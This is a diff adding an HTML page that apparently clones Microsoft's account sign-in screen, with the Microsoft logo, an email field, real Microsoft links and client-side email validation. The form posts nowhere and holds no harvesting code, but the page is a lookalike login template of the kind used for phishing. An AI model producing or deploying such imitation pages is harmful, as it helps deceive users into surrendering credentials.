@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="-1">
+
+    <link rel="stylesheet" href="my_style.css" media="all">
+    <link rel="shortcut icon" href="media/windows_icon.ico" />
+
+    <title>Sign in to your account</title>
+</head>
+
+<body>
+    <div id="branding" class="brandMS"></div>
+    <div class="middle">
+        <div id="content" class="content animateFadeIn">
+            <img id="companyLogo" src="media/microsoft_logo.svg" width="108" height="24" alt="Miccrosoft">
+            <main>
+                <article id="loginArticle" class="formattedColumn animateEntrance">
+                    <h2>Sign in</h2>
+                    <form id="loginForm" action="#" method="post" class="formattedColumn" novalidate="novalidate">
+                        <span id="usernameError" class="error"></span>
+                        <div class="inputField formattedColumn">
+                            <label for="username" hidden>User ID</label>
+                            <input type="email" placeholder="Email, phone, or Skype" id="username" name="username"
+                                class="login" required>
+                        </div>
+                        <div>
+                            <div class="formGroup">
+                                No account?
+                                <a
+                                    href="https://signup.live.com/signup?sru=https%3a%2f%2flogin.live.com%2foauth20_authorize.srf%3flc%3d1033%26client_id%3d4765445b-32c6-49b0-83e6-1d93765276ca%26mkt%3dEN-US%26opid%3d8CB93595889871F2%26opidt%3d1734006686%26uaid%3db9904fd430a3453d84771e8312ae356b%26contextid%3d2FF5109C6CB414F6%26opignore%3d1&mkt=EN-US&uiflavor=web&lw=1&fl=easi2&client_id=4765445b-32c6-49b0-83e6-1d93765276ca&uaid=b9904fd430a3453d84771e8312ae356b&suc=4765445b-32c6-49b0-83e6-1d93765276ca&lic=1">Create
+                                    one!</a>
+                            </div>
+                            <div class="formGroup">
+                                <a href="#">Can’t access your account?</a>
+                            </div>
+                        </div>
+
+                        <div class="buttonContainer">
+                            <button type="submit" class="button" id="submitButton">Next</button>
+                            <script>
+                                document.getElementById('loginForm').addEventListener('submit', function (event) {
+                                    var username = document.getElementById('username');
+                                    var usernameError = document.getElementById('usernameError');
+                                    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+                                    if (!username.value || !emailRegex.test(username.value)) {
+                                        usernameError.textContent = 'Enter a valid email address, phone number, or Skype name.';
+                                        event.preventDefault();
+                                    }
+                                });
+                            </script>
+                        </div>
+                    </form>
+                </article>
+            </main>
+        </div>
+        <div id="options" class="content optionBox animateFadeIn">
+            <img src="media/signin-options.svg" width="32" height="32">
+            Sign-in options
+        </div>
+    </div>
+    <footer>
+        <a href="https://www.microsoft.com/en-US/servicesagreement/">Terms of use</a>
+        <a href="https://privacy.microsoft.com/en-US/privacystatement">Privacy & cookies</a>
+        <a href="#">. . .</a>
+    </footer>
+</body>
+
+</html>
